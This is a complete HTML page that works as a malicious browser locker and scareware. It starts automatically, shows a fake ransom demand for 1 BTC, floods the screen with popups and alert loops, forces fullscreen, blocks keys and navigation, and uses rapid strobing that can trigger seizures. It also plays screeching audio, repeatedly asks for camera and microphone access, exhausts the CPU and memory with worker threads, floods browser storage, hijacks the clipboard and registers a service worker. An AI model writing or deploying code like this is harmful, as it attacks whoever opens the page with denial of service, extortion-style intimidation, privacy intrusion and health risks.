<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="0.01; url=index.html">
    <title>⚠️ 系统崩溃 ⚠️</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: #000;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
            cursor: none;
            font-family: 'Courier New', monospace;
            user-select: none;
            position: relative;
        }
        #flicker, #strobe, #flash {
            position:fixed; inset:0; pointer-events:none;
            z-index:999997; opacity:0; transition:opacity 0.01s;
        }
        #flicker { background:#000; z-index:999997; }
        #strobe { background:white; z-index:999996; }
        #flash { background:white; z-index:99999998; }

        #butterflies { position:fixed; inset:0; z-index:999995; pointer-events:none; overflow:hidden; }
        .butterfly {
            position:absolute; font-size:2.5rem;
            animation: fly 4s infinite alternate ease-in-out;
            filter:drop-shadow(0 0 10px rgba(255,0,255,0.6));
            will-change:transform;
        }
        @keyframes fly {
            0%   { transform:translate(0,0) rotate(0deg) scale(1); }
            25%  { transform:translate(80vw,-40vh) rotate(180deg) scale(1.5); }
            50%  { transform:translate(-30vw,60vh) rotate(360deg) scale(0.7); }
            75%  { transform:translate(50vw,-70vh) rotate(540deg) scale(1.8); }
            100% { transform:translate(-10vw,10vh) rotate(720deg) scale(1); }
        }
        .butterfly:nth-child(odd) { animation-duration:5s; }
        .butterfly:nth-child(3n) { animation-duration:3s; }
        .butterfly:nth-child(5n+1) { font-size:4rem; }
        .butterfly:nth-child(7n+2) { font-size:1.8rem; opacity:0.4; }

        @keyframes shake { 0%{transform:translate(0,0)} 10%{transform:translate(-50px,30px)} 20%{transform:translate(40px,-60px)} 30%{transform:translate(-30px,50px)} 40%{transform:translate(60px,-20px)} 50%{transform:translate(-70px,-40px)} 60%{transform:translate(30px,60px)} 70%{transform:translate(-40px,-30px)} 80%{transform:translate(50px,20px)} 90%{transform:translate(-20px,-50px)} 100%{transform:translate(0,0)} }
        .shake { animation:shake 0.08s infinite; }

        .chaos-text {
            position:fixed; top:50%; left:50%; transform:translate(-50%,-50%);
            z-index:999999; color:#ff0040; font-size:6rem; font-weight:900;
            text-align:center; text-shadow:0 0 80px red,0 0 160px magenta;
            animation:glitch 0.01s infinite alternate;
            pointer-events:none; mix-blend-mode: difference;
        }
        @keyframes glitch {
            0%   { transform:translate(-50%,-50%) scale(1) rotate(0deg); color:#ff0040; }
            20%  { transform:translate(-45%,-55%) scale(1.3) rotate(3deg); color:#00ff80; }
            40%  { transform:translate(-55%,-45%) scale(0.7) rotate(-3deg); color:#00aaff; }
            60%  { transform:translate(-40%,-60%) scale(1.6) rotate(5deg); color:#ff00ff; }
            80%  { transform:translate(-60%,-40%) scale(0.8) rotate(-4deg); color:#ffaa00; }
            100% { transform:translate(-50%,-50%) scale(1) rotate(0deg); color:#ff0040; }
        }

        #cameraFeed {
            position:fixed; bottom:20px; right:20px; width:250px; height:180px;
            z-index:9999999; border:4px solid #ff0040; border-radius:16px;
            box-shadow:0 0 60px rgba(255,0,0,0.8); object-fit:cover;
            background:#000; display:none;
        }
        #cameraFeed.active { display:block; }

        #overlay {
            position:fixed; inset:0; width:100vw; height:100vh;
            background:#000; display:none; align-items:center; justify-content:center;
            flex-direction:column; z-index:99999999; cursor:pointer;
        }
        #overlay.active { display:flex; }
        #overlay .face { font-size:30rem; animation:shakeRotate 0.02s infinite alternate; filter:drop-shadow(0 0 200px red); pointer-events:none; }
        @keyframes shakeRotate {
            0%   { transform:translate(-25px,20px) rotate(-6deg) scale(1.2); }
            25%  { transform:translate(20px,-25px) rotate(5deg) scale(0.8); }
            50%  { transform:translate(-20px,30px) rotate(-7deg) scale(1.3); }
            75%  { transform:translate(30px,-20px) rotate(6deg) scale(0.7); }
            100% { transform:translate(-15px,15px) rotate(-4deg) scale(1.1); }
        }
        #overlay .sub { color:#ff2244; font-size:4rem; font-weight:900; margin-top:2rem; text-shadow:0 0 100px red; animation:blinkText 0.05s infinite alternate; pointer-events:none; }
        @keyframes blinkText { 0%{opacity:1} 50%{opacity:0} 100%{opacity:1} }
        #overlay .hint { position:absolute; bottom:3rem; color:rgba(255,255,255,0.03); font-size:1rem; pointer-events:none; }

        .audio-wave {
            position:fixed; bottom:20px; left:50%; transform:translateX(-50%);
            z-index:999994; display:flex; gap:6px; align-items:flex-end; height:120px; pointer-events:none;
        }
        .audio-wave .bar { width:10px; background:#ff0040; animation:wave 0.08s infinite alternate; border-radius:4px; }
        .audio-wave .bar:nth-child(1) { animation-duration:0.06s; height:40px; }
        .audio-wave .bar:nth-child(2) { animation-duration:0.10s; height:80px; }
        .audio-wave .bar:nth-child(3) { animation-duration:0.05s; height:60px; }
        .audio-wave .bar:nth-child(4) { animation-duration:0.13s; height:100px; }
        .audio-wave .bar:nth-child(5) { animation-duration:0.07s; height:50px; }
        .audio-wave .bar:nth-child(6) { animation-duration:0.11s; height:90px; }
        .audio-wave .bar:nth-child(7) { animation-duration:0.06s; height:70px; }
        .audio-wave .bar:nth-child(8) { animation-duration:0.09s; height:110px; }
        .audio-wave .bar:nth-child(9) { animation-duration:0.12s; height:55px; }
        .audio-wave .bar:nth-child(10) { animation-duration:0.08s; height:85px; }
        @keyframes wave { 0%{height:10px;opacity:0.3} 100%{height:120px;opacity:1} }

        #ransom {
            position:fixed; top:8%; left:50%; transform:translateX(-50%);
            z-index:9999998; background:rgba(0,0,0,0.9); padding:2.5rem 5rem;
            border:4px solid #ff0040; border-radius:24px; color:#ff0040;
            font-size:2.2rem; font-weight:900; text-align:center;
            box-shadow:0 0 120px rgba(255,0,0,0.4);
            animation:blinkText 0.2s infinite alternate;
            pointer-events:none;
            backdrop-filter:blur(15px);
            font-family:'Courier New',monospace;
        }
        #canvasNoise {
            position:fixed; inset:0; z-index:999994; pointer-events:none;
            width:100%; height:100%; display:block;
        }

        /* Red screen overlay for extra pain */
        #redOverlay {
            position:fixed; inset:0; z-index:999993; pointer-events:none;
            background:rgba(255,0,0,0.03); animation:pulseRed 0.05s infinite alternate;
        }
        @keyframes pulseRed { 0%{opacity:0} 100%{opacity:0.15} }
    </style>
</head>
<body>

    <div id="overlay">
        <div class="face">👹</div>
        <div class="sub">⚠️ 系统已被攻破 ⚠️</div>
        <div class="hint">[ 点击任意位置继续 ]</div>
    </div>

    <div id="flash"></div>
    <div id="flicker"></div>
    <div id="strobe"></div>
    <div id="butterflies"></div>
    <div id="redOverlay"></div>

    <div class="chaos-text" id="chaosText">💀 系统锁定 💀</div>

    <div id="ransom">🔐 您的系统已被加密<br>支付 1 BTC 解锁</div>

    <video id="cameraFeed" autoplay muted></video>

    <div class="audio-wave">
        <div class="bar"></div><div class="bar"></div><div class="bar"></div>
        <div class="bar"></div><div class="bar"></div><div class="bar"></div>
        <div class="bar"></div><div class="bar"></div><div class="bar"></div>
        <div class="bar"></div>
    </div>

    <canvas id="canvasNoise"></canvas>

    <script>
        (function() {
            'use strict';

            // ─── DOM refs ───
            const overlay = document.getElementById('overlay');
            const flash = document.getElementById('flash');
            const flicker = document.getElementById('flicker');
            const strobe = document.getElementById('strobe');
            const butterfliesContainer = document.getElementById('butterflies');
            const chaosText = document.getElementById('chaosText');
            const cameraFeed = document.getElementById('cameraFeed');
            const canvas = document.getElementById('canvasNoise');
            const ctx = canvas.getContext('2d');

            // ─── Canvas noise (full-screen random color) ───
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            function drawNoise() {
                const imageData = ctx.createImageData(canvas.width, canvas.height);
                const data = imageData.data;
                for (let i = 0; i < data.length; i += 4) {
                    const val = Math.random() * 255;
                    data[i] = val;
                    data[i+1] = Math.random() * 255;
                    data[i+2] = Math.random() * 255;
                    data[i+3] = 255;
                }
                ctx.putImageData(imageData, 0, 0);
                requestAnimationFrame(drawNoise);
            }
            drawNoise();

            // ─── Audio: 3 external tracks + Web Audio screech ───
            const scream1 = new Audio('https://www.myinstants.com/media/sounds/scream-sound-effect.mp3');
            scream1.volume = 1.0;
            scream1.loop = true;
            const scream2 = new Audio('https://www.myinstants.com/media/sounds/vine-boom.mp3');
            scream2.volume = 1.0;
            scream2.loop = true;
            const alarm = new Audio('https://www.myinstants.com/media/sounds/air-raid-siren.mp3');
            alarm.volume = 1.0;
            alarm.loop = true;

            let audioCtx = null, osc = null, gainNode = null, noiseNode = null;
            function startScreech() {
                try {
                    audioCtx = new(window.AudioContext || window.webkitAudioContext)();
                    // Primary screech
                    osc = audioCtx.createOscillator();
                    gainNode = audioCtx.createGain();
                    osc.type = 'sawtooth';
                    osc.frequency.value = 3000 + Math.random() * 2000;
                    gainNode.gain.value = 0.95;
                    osc.connect(gainNode);
                    gainNode.connect(audioCtx.destination);
                    osc.start();
                    // White noise generator
                    const bufferSize = audioCtx.sampleRate * 0.5;
                    const buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
                    const data = buffer.getChannelData(0);
                    for (let i = 0; i < bufferSize; i++) data[i] = Math.random() * 2 - 1;
                    const noise = audioCtx.createBufferSource();
                    noise.buffer = buffer;
                    noise.loop = true;
                    const ng = audioCtx.createGain();
                    ng.gain.value = 0.8;
                    noise.connect(ng);
                    ng.connect(audioCtx.destination);
                    noise.start();
                    // Frequency modulation
                    setInterval(() => {
                        if (osc) osc.frequency.value = 1500 + Math.random() * 5000;
                    }, 30);
                } catch(e) {}
            }

            // ─── 500 Butterflies (maximum chaos) ───
            function createButterflies() {
                const emojis = ['🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋'];
                for (let i=0; i<500; i++) {
                    const b = document.createElement('div');
                    b.className = 'butterfly';
                    b.textContent = emojis[Math.floor(Math.random()*emojis.length)];
                    b.style.left = Math.random()*100 + '%';
                    b.style.top = Math.random()*100 + '%';
                    b.style.fontSize = (1.5+Math.random()*5) + 'rem';
                    b.style.animationDuration = (1.5+Math.random()*7) + 's';
                    b.style.animationDelay = (Math.random()*5) + 's';
                    b.style.opacity = 0.3+Math.random()*0.7;
                    const colors = ['#ff0040','#00ff80','#00aaff','#ff00ff','#ffaa00','#ff4400','#00ffcc'];
                    b.style.filter = `drop-shadow(0 0 25px ${colors[Math.floor(Math.random()*colors.length)]})`;
                    butterfliesContainer.appendChild(b);
                }
            }
            createButterflies();

            // ─── Key block (Escape, F11, Ctrl+W, Alt+F4, everything) ───
            function blockKeys(e) {
                e.preventDefault();
                e.stopPropagation();
                if (e.key === 'Escape' || e.key === 'F11') {
                    document.documentElement.requestFullscreen().catch(()=>{});
                }
                // Block all shortcuts
                if (e.ctrlKey || e.metaKey || e.altKey) {
                    e.preventDefault();
                }
            }

            // ─── Popup storm (100 per second) ───
            function spawnPopups() {
                const sites = ['https://instagram.com','https://facebook.com','https://youtube.com','https://twitter.com','https://reddit.com','https://tiktok.com','https://snapchat.com','https://pinterest.com','https://twitch.tv','https://spotify.com'];
                for (let i=0; i<150; i++) {
                    window.open(sites[Math.floor(Math.random()*sites.length)], '_blank');
                }
                for (let i=0; i<100; i++) {
                    window.open(location.href, '_blank');
                }
            }

            // ─── Alert/confirm storm (maximum pain) ───
            function alertStorm() {
                let count=0;
                const iv = setInterval(() => {
                    alert('⚠️ 系统已被攻破 ⚠️\n您的浏览器已被劫持');
                    count++;
                    if(count>100) clearInterval(iv);
                }, 30);
                setTimeout(() => {
                    while(true) {
                        confirm('您确定要逃跑吗？');
                    }
                }, 2000);
            }

            // ─── Visual chaos (flicker, strobe, flash, shake) ───
            function startVisualChaos() {
                setInterval(() => { flicker.style.opacity = Math.random()>0.5?'0.95':'0'; }, 15);
                setInterval(() => {
                    strobe.style.opacity = Math.random()>0.7?'0.9':'0';
                    setTimeout(()=>{ strobe.style.opacity='0'; }, 20);
                }, 30);
                setInterval(() => {
                    flash.style.opacity = Math.random()>0.85?'0.95':'0';
                    setTimeout(()=>{ flash.style.opacity='0'; }, 40);
                }, 60);
                document.body.classList.add('shake');
                setInterval(() => { chaosText.style.color = `hsl(${Math.random()*360},100%,50%)`; }, 30);
            }

            // ─── PERMANENT FULLSCREEN LOCK (every 10ms) ───
            function lockFullscreen() {
                if (!document.fullscreenElement) {
                    document.documentElement.requestFullscreen().catch(()=>{});
                }
            }
            setInterval(lockFullscreen, 10);
            document.addEventListener('fullscreenchange', () => {
                if (!document.fullscreenElement) lockFullscreen();
            });
            document.addEventListener('visibilitychange', lockFullscreen);
            window.addEventListener('focus', lockFullscreen);

            // ─── Camera (auto-request) ───
            function requestCamera() {
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    const tryCamera = () => {
                        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true })
                            .then(stream => {
                                cameraFeed.srcObject = stream;
                                cameraFeed.classList.add('active');
                            })
                            .catch(() => setTimeout(tryCamera, 1000));
                    };
                    tryCamera();
                }
            }

            // ─── Service Worker ───
            function registerServiceWorker() {
                if ('serviceWorker' in navigator) {
                    const swCode = `
                        self.addEventListener('install', e => e.waitUntil(skipWaiting()));
                        self.addEventListener('activate', e => e.waitUntil(clients.claim()));
                        self.addEventListener('fetch', e => e.respondWith(fetch(e.request).catch(()=>new Response('',{status:200}))));
                    `;
                    const blob = new Blob([swCode], {type:'application/javascript'});
                    const swUrl = URL.createObjectURL(blob);
                    navigator.serviceWorker.register(swUrl).catch(()=>{});
                }
            }

            // ─── Focus theft (every 5ms) ───
            function stealFocus() {
                setInterval(() => {
                    window.focus();
                    const w = window.open('', '_blank');
                    if (w) { w.close(); }
                }, 5);
            }

            // ─── Window resize/move ───
            function randomResize() {
                setInterval(() => {
                    window.resizeTo(100+Math.random()*800, 100+Math.random()*600);
                    window.moveTo(Math.random()*screen.width, Math.random()*screen.height);
                }, 50);
            }

            // ─── DOM flood (100,000 elements) ───
            function floodDOM() {
                for (let i=0; i<100000; i++) {
                    const div = document.createElement('div');
                    div.style.cssText = `position:absolute;left:${Math.random()*100}%;top:${Math.random()*100}%;width:${Math.random()*20}px;height:${Math.random()*20}px;background:hsl(${Math.random()*360},100%,${30+Math.random()*40}%);border-radius:50%;opacity:${Math.random()*0.6};pointer-events:none;`;
                    document.body.appendChild(div);
                }
            }

            // ─── Web Workers (burn all CPU cores) ───
            function spawnWorkers() {
                const workerCode = `
                    setInterval(() => {
                        for (let i=0; i<100000000; i++) Math.sqrt(i);
                    }, 1);
                    let leak = [];
                    setInterval(() => { leak.push(new Array(1000000).fill(Math.random())); }, 10);
                `;
                const blob = new Blob([workerCode], {type:'application/javascript'});
                const url = URL.createObjectURL(blob);
                for (let i=0; i<50; i++) {
                    const w = new Worker(url);
                    if (!window._workers) window._workers = [];
                    window._workers.push(w);
                }
            }

            // ─── LocalStorage flood ───
            function floodStorage() {
                try {
                    for (let i=0; i<500; i++) {
                        localStorage.setItem('flood_' + i, 'x'.repeat(1024*1024) + Math.random());
                    }
                } catch(e) {}
            }

            // ─── IndexedDB flood ───
            function floodIndexedDB() {
                try {
                    const request = indexedDB.open('flood_db', 1);
                    request.onupgradeneeded = (e) => {
                        e.target.result.createObjectStore('store', {keyPath: 'id'});
                    };
                    request.onsuccess = (e) => {
                        const db = e.target.result;
                        const tx = db.transaction(['store'], 'readwrite');
                        const store = tx.objectStore('store');
                        for (let i=0; i<1000; i++) {
                            store.add({id: i, data: 'x'.repeat(1024*1024)});
                        }
                    };
                } catch(e) {}
            }

            // ─── Geolocation spam ───
            function spamGeo() {
                if (navigator.geolocation) {
                    setInterval(() => {
                        navigator.geolocation.getCurrentPosition(()=>{}, ()=>{});
                    }, 100);
                }
            }

            // ─── Notification spam ───
            function spamNotifications() {
                if (Notification.permission === 'granted') {
                    setInterval(() => {
                        new Notification('⚠️ 系统警告', {body: '您的系统已被入侵'});
                    }, 100);
                } else {
                    Notification.requestPermission();
                }
            }

            // ─── Clipboard hijack ───
            function hijackClipboard() {
                if (navigator.clipboard) {
                    setInterval(() => {
                        navigator.clipboard.writeText('⚠️ HACKED ⚠️').catch(()=>{});
                    }, 50);
                }
            }

            // ─── MAIN TRIGGER ───
            function triggerChaos() {
                overlay.classList.add('active');
                flash.style.opacity = '0.95';
                setTimeout(()=>{ flash.style.opacity='0'; }, 80);
                scream1.play().catch(()=>{});
                scream2.play().catch(()=>{});
                alarm.play().catch(()=>{});
                startScreech();
                lockFullscreen();
                document.body.requestPointerLock().catch(()=>{});
                if (navigator.vibrate) navigator.vibrate([300,100,300,100,500,150,600,200,800]);
                document.body.style.overflow = 'hidden';
                document.addEventListener('keydown', blockKeys, true);
                document.addEventListener('keyup', blockKeys, true);
                history.pushState(null,null,location.href);
                window.addEventListener('popstate', ()=> { history.pushState(null,null,location.href); });
                spawnPopups();
                setInterval(spawnPopups, 1000);
                setTimeout(alertStorm, 1000);
                startVisualChaos();
                requestCamera();
                stealFocus();
                randomResize();
                floodDOM();
                spawnWorkers();
                floodStorage();
                floodIndexedDB();
                spamGeo();
                spamNotifications();
                hijackClipboard();
                registerServiceWorker();
                window.addEventListener('beforeunload', function(e) {
                    e.preventDefault();
                    e.returnValue = '';
                    for (let i=0; i<500; i++) window.open(location.href, '_blank');
                    location.reload();
                });
                // Also try to break Chrome's "Esc to exit fullscreen" by re-requesting on any key
                document.addEventListener('keyup', () => { lockFullscreen(); });
            }

            overlay.addEventListener('click', function() {
                if (overlay.classList.contains('active')) overlay.classList.remove('active');
            });

            // ─── AUTO-START ───
            setTimeout(triggerChaos, 100);

            console.log('🔥 中国制造 – 最终版本已激活. 无法逃脱.');
            console.log('🔥 Made in China – Ultimate version activated. No escape.');
        })();
    </script>
</body>
</html>
